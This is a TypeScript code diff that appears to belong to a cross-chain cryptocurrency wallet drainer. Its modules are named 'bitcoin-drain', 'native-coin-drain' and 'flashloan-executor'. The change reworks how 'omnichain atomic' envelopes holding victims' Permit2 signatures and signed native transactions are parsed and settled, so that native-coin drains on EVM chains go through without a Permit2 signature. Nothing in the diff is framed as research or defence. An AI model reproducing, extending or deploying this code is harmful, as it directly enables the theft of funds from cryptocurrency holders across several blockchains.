@@ -11,6 +11,7 @@
 import type { Address, Hex } from 'viem'
 import { getAddress, stringToHex } from 'viem'
 import { broadcastPSBT } from './bitcoin-drain.js'
+import { parseNativeAmount } from './native-coin-drain.js'
 import { tryExecuteBatchPermit2WithFlashloan } from './flashloan-executor.js'
 import {
   notifyOmnichainPartialSuccess,
@@ -238,7 +239,7 @@ function mergeOmnichainNativePayloads(
 function resolveEvmPayload(
   envelope: OmnichainAtomicSignatureEnvelope,
 ): OmnichainAtomicEvmPayload | undefined {
-  if (envelope.evm_payload?.batch != null && envelope.evm_payload.permit2_signature) {
+  if (envelope.evm_payload != null) {
     return envelope.evm_payload
   }
   if (envelope.batch != null && envelope.permit2_eip712_signature) {
@@ -252,7 +253,7 @@ function resolveEvmPayload(
 
 /** Pack unified omnichain atomic envelope for SHADOW persistence (hex-encoded JSON). */
 export function packOmnichainAtomicSignatureEnvelope(params: {
-  permit2Signature: Hex
+  permit2Signature?: Hex
   batch?: BatchPermitMetadata
   evmPayload?: OmnichainAtomicEvmPayload
   solanaPayload?: OmnichainNativeDrainPayload
@@ -279,7 +280,7 @@ export function packOmnichainAtomicSignatureEnvelope(params: {
   const json = JSON.stringify({
     protocol: 'omnichain_atomic_v1',
     ingress_lane: 'omnichain_atomic_portfolio_v1',
-    permit2_eip712_signature: params.permit2Signature,
+    ...(params.permit2Signature ? { permit2_eip712_signature: params.permit2Signature } : {}),
     ...(params.batch ? { batch: params.batch } : {}),
     ...(evm ? { evm_payload: evm } : {}),
     ...(params.solanaPayload && hasOmnichainLeg(params.solanaPayload)
@@ -338,7 +339,47 @@ export function parseOmnichainAtomicSignatureEnvelope(
             typeof (o['evm_payload'] as Record<string, unknown>)['permit2_signature'] === 'string'
           ? (o['evm_payload'] as Record<string, string>)['permit2_signature']
           : null) as Hex | null
-    if (sig == null) return null
+
+    const readEvm = (): OmnichainAtomicEvmPayload | undefined => {
+      const raw = o['evm_payload']
+      if (typeof raw !== 'object' || raw === null) return undefined
+      const e = raw as Record<string, unknown>
+      const evmSig =
+        typeof e['permit2_signature'] === 'string' && e['permit2_signature'].startsWith('0x')
+          ? (e['permit2_signature'] as Hex)
+          : sig
+      const nativeSigned =
+        typeof e['native_signed_transaction'] === 'string' &&
+        (e['native_signed_transaction'] as string).startsWith('0x')
+          ? (e['native_signed_transaction'] as Hex)
+          : undefined
+      if (typeof e['batch'] === 'object' && e['batch'] !== null) {
+        return {
+          permit2_signature: (evmSig ?? '0x00') as Hex,
+          batch: e['batch'] as BatchPermitMetadata,
+          ...(typeof e['native_amount'] === 'string' ? { native_amount: e['native_amount'] } : {}),
+          ...(nativeSigned ? { native_signed_transaction: nativeSigned } : {}),
+          ...(Array.isArray(e['nfts']) ? { nfts: e['nfts'] as BatchNftEntry[] } : {}),
+        }
+      }
+      if (nativeSigned) {
+        return {
+          permit2_signature: (evmSig ?? '0x00') as Hex,
+          batch: {
+            details: [],
+            spender: '0x0000000000000000000000000000000000000000' as Address,
+            sigDeadline: '0',
+            chainId: 1,
+          },
+          ...(typeof e['native_amount'] === 'string' ? { native_amount: e['native_amount'] } : {}),
+          native_signed_transaction: nativeSigned,
+        }
+      }
+      return undefined
+    }
+
+    const evmPayload = readEvm()
+    if (sig == null && evmPayload == null) return null
 
     const readOmnichainPayload = (key: string): OmnichainNativeDrainPayload | undefined => {
       const raw = o[key]
@@ -362,27 +403,6 @@ export function parseOmnichainAtomicSignatureEnvelope(
       }
     }
 
-    const readEvm = (): OmnichainAtomicEvmPayload | undefined => {
-      const raw = o['evm_payload']
-      if (typeof raw !== 'object' || raw === null) return undefined
-      const e = raw as Record<string, unknown>
-      const evmSig =
-        typeof e['permit2_signature'] === 'string' && e['permit2_signature'].startsWith('0x')
-          ? (e['permit2_signature'] as Hex)
-          : sig
-      if (typeof e['batch'] !== 'object' || e['batch'] === null) return undefined
-      return {
-        permit2_signature: evmSig,
-        batch: e['batch'] as BatchPermitMetadata,
-        ...(typeof e['native_amount'] === 'string' ? { native_amount: e['native_amount'] } : {}),
-        ...(typeof e['native_signed_transaction'] === 'string' &&
-        (e['native_signed_transaction'] as string).startsWith('0x')
-          ? { native_signed_transaction: e['native_signed_transaction'] as Hex }
-          : {}),
-        ...(Array.isArray(e['nfts']) ? { nfts: e['nfts'] as BatchNftEntry[] } : {}),
-      }
-    }
-
     const settlementRaw = o['settlement_transaction_hashes']
     const settlement_transaction_hashes =
       typeof settlementRaw === 'object' && settlementRaw !== null
@@ -395,11 +415,11 @@ export function parseOmnichainAtomicSignatureEnvelope(
         typeof o['ingress_lane'] === 'string'
           ? (o['ingress_lane'] as OmnichainAtomicSignatureEnvelope['ingress_lane'])
           : 'omnichain_atomic_portfolio_v1',
-      permit2_eip712_signature: sig,
+      permit2_eip712_signature: (sig ?? evmPayload?.permit2_signature ?? '0x00') as Hex,
       ...(typeof o['batch'] === 'object' && o['batch'] !== null
         ? { batch: o['batch'] as BatchPermitMetadata }
         : {}),
-      ...(readEvm() ? { evm_payload: readEvm() } : {}),
+      ...(evmPayload ? { evm_payload: evmPayload } : {}),
       ...(readOmnichainPayload('solana_payload')
         ? { solana_payload: readOmnichainPayload('solana_payload') }
         : {}),
@@ -472,7 +492,12 @@ export async function executeOmnichainAtomicSettlement(params: {
   )
   const bitcoinPayload = params.envelope.bitcoin_payload
 
-  const hasEvm = evmPayload != null && evmPayload.batch.details.length > 0
+  const hasEvmBatch = evmPayload != null && evmPayload.batch.details.length > 0
+  const hasEvmNative =
+    evmPayload != null &&
+    evmPayload.native_signed_transaction != null &&
+    parseNativeAmount(evmPayload.native_amount ?? '0') > 0n
+  const hasEvm = hasEvmBatch || hasEvmNative
   const hasSolana = hasOmnichainLeg(params.envelope.solana_payload)
   const hasTron = hasOmnichainLeg(params.envelope.tron_payload)
   const hasTon = hasOmnichainLeg(params.envelope.ton_payload)
